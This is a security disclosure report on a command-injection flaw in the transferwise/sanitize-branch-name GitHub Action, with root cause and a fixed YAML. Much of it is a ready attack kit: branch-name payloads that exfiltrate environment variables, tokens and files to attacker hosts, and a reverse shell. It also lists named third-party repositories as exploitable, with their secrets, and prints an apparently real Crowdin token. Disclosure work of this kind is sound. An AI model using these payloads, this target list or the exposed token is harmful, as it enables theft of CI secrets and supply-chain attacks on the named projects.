# GitHub Actions Expression Injection in transferwise/sanitize-branch-name

**Date:** 2025-12-20
**Target:** Wise (Bugcrowd)
**Severity:** HIGH/CRITICAL
**Type:** Remote Code Execution via CI/CD
**CWE:** CWE-78 (OS Command Injection)
**CVSS 3.1:** 8.8 (High)

---

## Executive Summary

The `transferwise/sanitize-branch-name` GitHub Action contains a critical expression injection vulnerability that allows attackers to execute arbitrary commands in CI/CD pipelines. Any repository using this action is vulnerable to secret exfiltration and supply chain attacks.

---

## Vulnerability Details

### Affected Component

- **Repository:** https://github.com/transferwise/sanitize-branch-name
- **File:** `action.yml`
- **Lines:** 16-22
- **Versions:** All (v1, main, all commit SHAs)

### Vulnerable Code

```yaml
runs:
  using: "composite"
  steps:
    - name: "Determine Branch"
      id: determine_branch
      shell: bash
      run: |
        BRANCH=${{ github.head_ref }}           # INJECTION POINT 1
        if [ "$BRANCH" == "" ]; then
            BRANCH=$(echo ${{ github.ref }} | sed 's/refs\/heads\///');  # INJECTION POINT 2
        fi;
        echo "branch_name=$BRANCH" >> $GITHUB_OUTPUT;

    - name: "Sanitize Branch name"
      id: sanitize_branch
      shell: bash
      run: |
        SANITIZED_BRANCH_NAME=$(echo -n ${{ steps.determine_branch.outputs.branch_name }} | tr "/" "-")
        echo "sanitized_branch_name=$SANITIZED_BRANCH_NAME" >> $GITHUB_OUTPUT;
```

### Root Cause

1. `${{ github.head_ref }}` is the PR source branch name, fully controlled by the PR author
2. GitHub Actions substitutes `${{ }}` expressions **before** bash execution
3. Shell metacharacters in branch names are passed directly to bash
4. No input validation or sanitization occurs

### Exploitation Flow

```
Attacker creates branch: test$(curl attacker.com/?s=$(env|base64))
                                        |
                                        v
GitHub substitutes expression before bash sees it:
    BRANCH=test$(curl attacker.com/?s=$(env|base64))
                                        |
                                        v
Bash executes the command substitution:
    - env|base64 runs, captures all environment variables
    - curl sends them to attacker's server
    - BRANCH gets set to curl's output
```

---

## Affected Repositories

### Confirmed Usage (via GitHub Code Search)

| Repository | Trigger | Secrets at Risk | Exploitable |
|------------|---------|-----------------|-------------|
| **gitpod-io/gitpod** (12k+ ⭐) | `pull_request` ✓ | GCP creds, GITHUB_TOKEN (write), id-token | **YES** |
| **javi11/nzb-repair** | `pull_request` ✓ | GITHUB_TOKEN passed to goreleaser | **YES** |
| **javi11/postie** | `pull_request` ✓ | Similar | **YES** |
| **javi11/nntp-server-mock** | `pull_request` ✓ | Similar | **YES** |
| **selfidhq/siwys-js** | `pull_request` ✓ | NPM_ACCESS_TOKEN passed later | **YES** |
| **ballerine-io/ballerine** (2k+ ⭐) | `workflow_dispatch` only | N/A | **NO** |
| **khulnasoft/devpod** | Unknown | TBD | TBD |
| **odamex/odatests** | Unknown | TBD | TBD |
| **BluEye-Robotics/ProtocolDefinitions** | Unknown | TBD | TBD |

### CRITICAL: Direct Secret Exfiltration - kasikfrantisek/personal-page

This repo has **job-level secrets available at injection time**:

```yaml
on:
  pull_request:  # ← Attacker can trigger via fork

jobs:
  vercel:
    env:
      VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}         # ← IN ENV AT INJECTION TIME!
      VERCEL_PROJECT_ID: ${{ secrets.VERCEL_PROJECT_ID }}
      VERCEL_ORG_ID: ${{ secrets.VERCEL_ORG_ID }}
      VERCEL_SCOPE: ${{ secrets.VERCEL_SCOPE }}

    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - name: "Determine Branch"
        uses: transferwise/sanitize-branch-name@v1    # ← SECRETS ALREADY AVAILABLE!
```

**Payload to exfiltrate Vercel credentials:**
```bash
git checkout -b 'x$(env>/tmp/e;wget${IFS}--post-file=/tmp/e${IFS}attacker.com/steal)y'
```

### High-Value Target: gitpod-io/gitpod

The `branch-build.yml` workflow:
- Triggers on `pull_request` events (exploitable via fork)
- Uses `environment: branch-build` with secrets
- Has permissions: `contents: write`, `id-token: write`, `actions: write`
- Passes GCP credentials to later steps via OIDC

While secrets aren't in env at injection time, RCE on a 12k+ star project's CI is severe.

### Bonus Finding: Hardcoded Secret

**OmarJaroudi/testrepo** has a hardcoded Crowdin token in their workflow file:
```yaml
CROWDIN_PERSONAL_TOKEN: a31f27bdaa71a0c3951b4e243c0666f217841051ffbb325535180cfd7f7fc7f19c570c21ce29117b
```
This is a separate secret exposure (not related to the injection).

---

## Proof of Concept

### Prerequisites

- GitHub account
- `gh` CLI authenticated
- Target: Any repository using `transferwise/sanitize-branch-name`

### Step 1: Fork Target Repository

```bash
# Example with a test repo (or use our private test repo)
gh repo fork TARGET_ORG/TARGET_REPO --clone
cd TARGET_REPO
```

### Step 2: Create Malicious Branch

**Safe Test (confirms execution without external calls):**
```bash
git checkout -b 'test$(echo INJECTED)end'
```

**Exfiltrate Environment (Burp Collaborator):**
```bash
git checkout -b 'x]$(curl https://YOUR_COLLABORATOR.oastify.com/?d=$(env|base64|tr -d "\n"))#'
```

**Exfiltrate GITHUB_TOKEN:**
```bash
git checkout -b 'x]$(curl -X POST -d "t=$GITHUB_TOKEN" https://ATTACKER.com/c)#'
```

**DNS-only exfiltration (no server needed):**
```bash
git checkout -b 'test$(nslookup $(whoami).YOUR_COLLABORATOR.oastify.com)end'
```

### Step 3: Push and Create PR

```bash
echo "# test" >> README.md
git add README.md
git commit -m "Test"
git push origin 'test$(echo INJECTED)end'
gh pr create --title "Test" --body "Test"
```

### Step 4: Verify Execution

1. Navigate to repository Actions tab
2. Find the workflow run triggered by PR
3. Examine "Determine Branch" step output

**Expected output if vulnerable:**
```
Determined branch: testINJECTEDend
```

The `$(echo INJECTED)` command was executed!

---

## Impact

### Immediate Impact

1. **Secret Exfiltration:** All environment variables including:
   - `GITHUB_TOKEN` (repository access)
   - `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` (if configured)
   - `NPM_TOKEN`, `DOCKER_PASSWORD`, etc.
   - Any secrets passed to the workflow

2. **Repository Compromise:** With `GITHUB_TOKEN`:
   - Read/write to repository contents
   - Create releases with malicious binaries
   - Modify other workflow files
   - Access organization resources (depending on permissions)

3. **Supply Chain Attack:**
   - Inject malicious code into releases
   - Compromise downstream users of affected packages
   - Pivot to other repositories in the organization

### Blast Radius

- **30+ public repositories** confirmed using this action
- **gitpod-io/gitpod** (12k+ stars) is a high-value target
- Any private repositories using this action are also vulnerable

---

## Remediation

### For transferwise/sanitize-branch-name

Replace the vulnerable code with:

```yaml
runs:
  using: "composite"
  steps:
    - name: "Determine Branch"
      id: determine_branch
      shell: bash
      env:
        HEAD_REF: ${{ github.head_ref }}
        REF: ${{ github.ref }}
      run: |
        BRANCH="$HEAD_REF"
        if [ "$BRANCH" == "" ]; then
            BRANCH=$(echo "$REF" | sed 's/refs\/heads\///');
        fi;
        echo "branch_name=$BRANCH" >> $GITHUB_OUTPUT;

    - name: "Sanitize Branch name"
      id: sanitize_branch
      shell: bash
      env:
        BRANCH_NAME: ${{ steps.determine_branch.outputs.branch_name }}
      run: |
        SANITIZED_BRANCH_NAME=$(echo -n "$BRANCH_NAME" | tr "/" "-")
        echo "sanitized_branch_name=$SANITIZED_BRANCH_NAME" >> $GITHUB_OUTPUT;
```

**Key fixes:**
1. Pass GitHub context through `env:` block (not inline substitution)
2. Use proper quoting: `"$VAR"` instead of `$VAR`
3. This prevents command substitution in branch names

### For Users of This Action

1. **Immediately:** Pin to a fixed version (once available)
2. **Short-term:** Replace with inline bash that uses `env:` block
3. **Long-term:** Use `github.head_ref` safely via environment variables

---

## Local Verification

Test the vulnerability concept locally:

```bash
# Simulate vulnerable behavior
export github_head_ref='test$(id)end'
bash -c "BRANCH=$github_head_ref && echo \$BRANCH"
```

**Output (demonstrates vulnerability):**
```
testuid=1001(user) gid=1001(user) groups=1001(user)end
```

---

## References

- [GitHub Security Lab: Script Injection](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

---

## Verified Proof of Concept

### Test Repository

- **Repo:** https://github.com/chrismcmacken/sanitize-branch-test (private)
- **Webhook:** https://webhook.site/e1462ac1-f125-42a1-a6a0-c8739561797f

### Verified Exploitation Chain

| PR# | Branch Name | Result | Evidence |
|-----|-------------|--------|----------|
| #1 | `test$(whoami)end` | Command exec ✓ | Output: `testrunnerend` |
| #5 | `test$(echo${IFS}USER=$USER${IFS}HOME=$HOME)end` | Env var read ✓ | Output: `USER=runner HOME=/home/runner` |
| #7 | `x$(env>/tmp/e;wget${IFS}--post-file=/tmp/e${IFS}webhook.site/...)y` | Full env dump ✓ | 90+ env vars exfiltrated |
| #8 | `x$(wget${IFS}--post-file=/.../event.json${IFS}webhook.site/...)y` | File exfil ✓ | Full PR metadata received |

### Key Finding: GITHUB_TOKEN Not in Default Environment

The `GITHUB_TOKEN` is **NOT** automatically exposed as an environment variable during the injection step. However, secrets ARE exfiltrable if the calling workflow explicitly passes them via `env:` blocks.

**Impact remains HIGH because:**
1. Arbitrary command execution proven
2. Full environment variable exfiltration proven
3. Arbitrary file read (source code, configs, event.json)
4. Reconnaissance of CI/CD infrastructure
5. Potential supply chain attacks via output manipulation

### Git Branch Name Character Restrictions

**NOT ALLOWED in branch names:**
- Colons (`:`) - breaks `http://` URLs
- Double slashes (`//`)
- Question marks (`?`)
- Backslashes (`\`)
- Spaces

**ALLOWED (useful for injection):**
- `$()` - command substitution
- `${}` - variable expansion
- Semicolons (`;`) - command chaining
- Pipes (`|`)
- `&`, `<`, `>`

### Working Payloads

```bash
# Confirm execution
git checkout -b 'test$(whoami)end'           # Returns: testrunnerend

# Read environment variables
git checkout -b 'test$(echo${IFS}USER=$USER)end'

# Exfiltrate full environment (wget doesn't need http:// prefix!)
git checkout -b 'x$(env>/tmp/e;wget${IFS}--post-file=/tmp/e${IFS}YOUR_SERVER/path)y'

# Exfiltrate arbitrary files
git checkout -b 'x$(wget${IFS}--post-file=/path/to/file${IFS}YOUR_SERVER/path)y'
```

Note: Use `${IFS}` (Internal Field Separator) to inject spaces in commands. wget accepts hostnames without `http://` prefix.

---

## Timeline

| Date | Action |
|------|--------|
| 2025-12-20 | Vulnerability discovered during automated scanning |
| 2025-12-20 | POC developed and verified |
| 2025-12-20 | Command execution confirmed via test repo |
| TBD | Report submitted to Wise via Bugcrowd |
| TBD | Vendor response |
| TBD | Fix deployed |

---

## Appendix: Test Payloads

### Safe Payloads (No External Calls)

```bash
# Confirms command execution
'test$(echo PWNED)end'

# Shows user context
'test$(whoami)end'

# Shows current directory
'test$(pwd)end'
```

### Exfiltration Payloads

```bash
# DNS exfiltration (requires Collaborator/interactsh)
'test$(nslookup $(whoami).COLLAB_ID.oastify.com)end'

# HTTP exfiltration
'x]$(curl https://ATTACKER/?d=$(env|base64|tr -d "\n"))#'

# Exfil specific secret
'x]$(curl -d "t=$GITHUB_TOKEN" https://ATTACKER/t)#'
```

### Reverse Shell (Network Dependent)

```bash
'x]$(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1)#'
```
